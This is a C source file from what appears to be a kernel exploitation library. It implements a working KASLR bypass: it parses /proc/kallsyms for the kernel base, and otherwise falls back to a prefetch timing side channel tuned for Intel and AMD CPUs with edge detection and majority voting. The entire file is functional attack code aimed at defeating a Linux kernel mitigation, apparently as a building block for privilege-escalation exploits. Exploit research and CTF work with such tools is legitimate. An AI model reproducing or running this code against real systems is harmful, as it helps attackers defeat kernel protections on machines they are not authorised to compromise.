#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <kpwn/x86_64/side_channel.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define KERNEL_TEXT_MIN 0xffffffff80000000ull
#define KERNEL_TEXT_MAX 0xffffffffc0000000ull
#define KASLR_ALIGN 0x200000ull
#define NUM_SLOTS ((KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / KASLR_ALIGN)

#define WARMUP_ITERATIONS 3
#define MEASURE_ITERATIONS 64
#define CONFIRM_PASSES 7

#define AMD_CONFIRM_K 5
#define AMD_CONFIRM_M 8

static int cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

static void warm_tlb(void) { syscall(SYS_getgid); }

static void collect_timings(uint64_t *times) {
  for (int pass = 0; pass < WARMUP_ITERATIONS + MEASURE_ITERATIONS; pass++) {
    for (size_t idx = 0; idx < NUM_SLOTS; idx++) {
      uint64_t addr = KERNEL_TEXT_MIN + idx * KASLR_ALIGN;
      warm_tlb();
      uint64_t t = measure_prefetch((void *)addr);
      if (pass >= WARMUP_ITERATIONS)
        times[idx] += t;
    }
  }
  for (size_t idx = 0; idx < NUM_SLOTS; idx++)
    times[idx] /= MEASURE_ITERATIONS;
}

// Intel: mapped page = LOWER latency. On newer CPUs (Arrow Lake+) the delta
// is small (~5 cycles) so a global-minimum search picks up entry trampoline
// spikes instead of kbase. Use a falling-edge detector: find the first
// sustained drop below a threshold derived from the median of all slots.
static size_t find_base_intel(const uint64_t *times) {
  uint64_t sorted[NUM_SLOTS];
  memcpy(sorted, times, sizeof(sorted));
  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);

  uint64_t median = sorted[NUM_SLOTS / 2];
  // Threshold: anything below 95% of median is "low" (mapped)
  uint64_t threshold = median - median / 20;

  log_debug("[kpwn:kaslr] intel median=%lu threshold=%lu", median, threshold);

  // Skip any initial low-latency region
  size_t start = 0;
  while (start < NUM_SLOTS && times[start] <= threshold)
    start++;

  // Find the high→low falling edge (unmapped → mapped transition)
  for (size_t idx = start; idx < NUM_SLOTS; idx++) {
    if (times[idx] > threshold)
      continue;
    // idx is low-latency; confirm sustained run
    if (idx + AMD_CONFIRM_M > NUM_SLOTS)
      break;
    int count = 0;
    for (size_t j = 0; j < AMD_CONFIRM_M; j++) {
      if (times[idx + j] <= threshold)
        count++;
    }
    if (count >= AMD_CONFIRM_K)
      return KERNEL_TEXT_MIN + idx * KASLR_ALIGN;
  }

  // Fallback: global minimum (classic EntryBleed behavior)
  uint64_t min_time = UINT64_MAX;
  size_t best = 0;
  for (size_t i = 0; i < NUM_SLOTS; i++) {
    if (times[i] < min_time) {
      min_time = times[i];
      best = i;
    }
  }
  log_debug("[kpwn:kaslr] intel edge detection failed, fallback min slot=%zu",
            best);
  return KERNEL_TEXT_MIN + best * KASLR_ALIGN;
}

// AMD: mapped page = HIGHER latency (inverted vs Intel).
// The kernel text region shows as a band of high-latency slots surrounded by
// low-latency unmapped slots. We detect the LOW→HIGH rising edge: find the
// first slot where timing jumps from below threshold to above, skipping any
// initial high-latency region at the scan start (other kernel mappings).
static size_t find_base_amd(const uint64_t *times) {
  uint64_t sorted[NUM_SLOTS];
  memcpy(sorted, times, sizeof(sorted));
  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);

  uint64_t median = sorted[NUM_SLOTS / 2];
  uint64_t threshold = median + median / 2;

  log_debug("[kpwn:kaslr] amd median=%lu threshold=%lu", median, threshold);

  // Skip any initial high-latency region (pre-text kernel mappings)
  size_t start = 0;
  while (start < NUM_SLOTS && times[start] > threshold)
    start++;

  // Find the low→high rising edge: scan for a low-latency slot followed by
  // a confirmed band of high-latency slots. The kbase is the last low-latency
  // slot before the high band (the text mapping starts at kbase but the first
  // prefetch-distinguishable page is kbase + KASLR_ALIGN).
  size_t last_low = start;
  for (size_t idx = start; idx < NUM_SLOTS; idx++) {
    if (times[idx] <= threshold) {
      last_low = idx;
      continue;
    }
    // idx is high-latency; confirm it's a real band, not a spike
    if (idx + AMD_CONFIRM_M > NUM_SLOTS)
      break;
    int count = 0;
    for (size_t j = 0; j < AMD_CONFIRM_M; j++) {
      if (times[idx + j] > threshold)
        count++;
    }
    if (count >= AMD_CONFIRM_K)
      return KERNEL_TEXT_MIN + last_low * KASLR_ALIGN;
  }
  return 0;
}

// --- public API --------------------------------------------------------------

size_t kasld_prefetch() {
  enum side_channel_arch arch = get_arch();

  uint64_t *times = calloc(NUM_SLOTS, sizeof(uint64_t));
  ASSERT(times != NULL);

  size_t results[CONFIRM_PASSES];

  for (int pass = 0; pass < CONFIRM_PASSES; pass++) {
    memset(times, 0, NUM_SLOTS * sizeof(uint64_t));
    collect_timings(times);

    switch (arch) {
    case x86_64_intel:
      results[pass] = find_base_intel(times);
      break;
    case x86_64_amd:
      results[pass] = find_base_amd(times);
      break;
    default:
      log_error("[kpwn:kaslr] unsupported arch for prefetch");
      free(times);
      return 0;
    }

    log_debug("[kpwn:kaslr] pass %d/%d result=0x%lx", pass + 1, CONFIRM_PASSES,
              results[pass]);
  }

  free(times);

  struct count_sort_data majority =
      count_sort((const uint64_t *)results, CONFIRM_PASSES);

  if (majority.counter > CONFIRM_PASSES / 2 && majority.data != 0) {
    log_success("[kpwn:kaslr] prefetch kbase=0x%lx votes=%zu/%d", majority.data,
                majority.counter, CONFIRM_PASSES);
    return majority.data;
  }

  log_warn("[kpwn:kaslr] prefetch inconclusive (best=0x%lx votes=%zu/%d)",
           majority.data, majority.counter, CONFIRM_PASSES);
  return 0;
}

size_t kasld_proc_kallsyms() {
  char *content = slurp_file("/proc/kallsyms", 1 << 20);
  if (!content)
    return 0;

  // Check first few lines for all-zeros (restricted)
  int all_zero = 1;
  char *p = content;
  for (int i = 0; i < 16 && *p; i++) {
    if (*p != '0') {
      all_zero = 0;
      break;
    }
    while (*p && *p != '\n')
      p++;
    if (*p)
      p++;
  }
  if (all_zero) {
    free(content);
    log_debug("[kpwn:kaslr] /proc/kallsyms restricted (all zeros)");
    return 0;
  }

  // Search for _text or _stext
  p = content;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (!nl)
      nl = p + strlen(p);

    char addr_str[20] = {0};
    char type;
    char sym[256] = {0};
    if (sscanf(p, "%19s %c %255s", addr_str, &type, sym) == 3) {
      if ((strcmp(sym, "_text") == 0 || strcmp(sym, "_stext") == 0) &&
          (type == 'T' || type == 't')) {
        uint64_t addr = strtoull(addr_str, NULL, 16);
        if (addr > 0xffff000000000000ull) {
          free(content);
          log_success("[kpwn:kaslr] kallsyms %s=0x%lx", sym, addr);
          return addr;
        }
      }
    }

    if (!*nl)
      break;
    p = nl + 1;
  }

  free(content);
  log_debug("[kpwn:kaslr] /proc/kallsyms: _text not found");
  return 0;
}

size_t kasld() {
  // Strategy 1: /proc/kallsyms (cheapest, but needs perf_event_paranoid<=1)
  size_t base = kasld_proc_kallsyms();
  if (base) {
    log_info("[kpwn:kaslr] method=kallsyms kbase=0x%lx", base);
    return base;
  }

  // Strategy 2: prefetch side-channel (works unprivileged on Intel and AMD)
  base = kasld_prefetch();
  if (base) {
    log_info("[kpwn:kaslr] method=prefetch kbase=0x%lx", base);
    return base;
  }

  log_error("[kpwn:kaslr] all methods failed");
  return 0;
}

// --- legacy API (delegates to kasld_prefetch) --------------------------------

size_t kasld_amd() { return kasld_prefetch(); }
size_t kasld_intel() { return kasld_prefetch(); }

size_t kasld_amd_with_conf(size_t start, size_t end, size_t step,
                           size_t num_confirm, size_t window_size) {
  (void)start;
  (void)end;
  (void)step;
  (void)num_confirm;
  (void)window_size;
  return kasld_prefetch();
}

size_t kasld_intel_with_conf(size_t start, size_t end, size_t step,
                             size_t num_confirm) {
  (void)start;
  (void)end;
  (void)step;
  (void)num_confirm;
  return kasld_prefetch();
}

enum side_channel_arch get_arch() {
  char info[0x10];
  cpuinfo_str(info);

  log_debug("[kpwn:kaslr] cpu vendor=%s", info);

  if (strcmp(info, "GenuineIntel") == 0)
    return x86_64_intel;
  else if (strcmp(info, "AuthenticAMD") == 0)
    return x86_64_amd;

  log_warn("[kpwn:kaslr] unknown vendor: %s", info);
  return unknown_arch;
}
